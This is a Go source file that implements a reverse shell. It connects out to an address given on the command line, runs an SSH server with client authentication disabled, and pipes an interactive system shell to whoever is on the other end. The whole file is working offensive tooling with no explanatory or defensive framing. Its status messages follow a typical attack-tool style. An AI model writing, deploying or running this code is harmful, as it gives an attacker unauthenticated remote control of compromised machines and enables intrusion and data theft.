package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"

	"golang.org/x/crypto/ssh"
)

func main() {
	// connect can be just host (1.2.3.4) or host+port (1.2.3.4:8443)
	connect := os.Args[1]
	if !strings.Contains(connect, ":") {
		connect += ":22"
	}

	config := ssh.ServerConfig{
		NoClientAuth: true,
	}

	hostkey, err := makeHostKey()
	if err != nil {
		fmt.Println("[!] Error creating key.")
		return
	}
	config.AddHostKey(hostkey)

	conn, err := net.Dial("tcp", connect)
	if err != nil {
		fmt.Println("[!] Error connecting to ", connect)
		return
	}

	ssh_connection, channels, requests, err := ssh.NewServerConn(conn, &config)
	if err != nil {
		fmt.Println("[!] Handshake failed:", err)
		return
	}
	fmt.Println("[+] Connection successful.")

	go handleRequests(requests)
	go handleChannels(channels)
	ssh_connection.Wait()
}

func handleRequests(requests <-chan *ssh.Request) {
	for req := range requests {
		fmt.Println("[*] Recieved out-of-band request:", req)
	}
}

func handleChannels(channels <-chan ssh.NewChannel) {
	for newChannel := range channels {
		if t := newChannel.ChannelType(); t != "session" {
			newChannel.Reject(ssh.UnknownChannelType, fmt.Sprintf("[*] Unknown channel type: %s\n", t))
			continue
		}
		channel, requests, err := newChannel.Accept()
		if err != nil {
			fmt.Println("Error accepting channel", err)
			continue
		}

		shell := os.Getenv("SHELL")
		if shell == "" {
			shell = DEFAULT_SHELL
		}

		// Not dealing with any type of request except shell
		go func(in <-chan *ssh.Request) {
			for req := range in {
				ok := false
				switch req.Type {
				case "shell":
					ok = true
					go func() {
						defer channel.Close()
						cmd := exec.Command(shell)
						cmd.Stdin = channel
						cmd.Stdout = channel
						cmd.Stderr = channel
						cmd.Start()
						cmd.Wait()
					}()
					if len(req.Payload) > 0 {
						ok = false
					}
				}
				if !ok {
					fmt.Println("[*] Declining request:", req.Type)
				}
				req.Reply(ok, nil)
			}
		}(requests)
	}
}

func makeHostKey() (ssh.Signer, error) {
	key, err := rsa.GenerateKey(rand.Reader, 2014)
	if err != nil {
		return nil, err
	}
	privateKey := pem.Block{
		Type:    "RSA PRIVATE KEY",
		Headers: nil,
		Bytes:   x509.MarshalPKCS1PrivateKey(key),
	}
	hostkey, err := ssh.ParsePrivateKey(pem.EncodeToMemory(&privateKey))
	if err != nil {
		return nil, err
	}
	return hostkey, nil
}
